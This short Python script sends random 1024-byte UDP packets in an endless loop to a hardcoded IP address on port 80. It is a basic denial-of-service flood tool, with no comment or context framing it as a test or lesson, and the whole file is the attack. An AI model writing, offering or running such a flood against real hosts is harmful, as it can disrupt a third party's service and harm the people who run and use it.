import socket
import random

dest_ip = '208.80.154.224'
dest_port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet = random._urandom(1024)

while True:
    s.sendto(packet, (dest_ip, dest_port))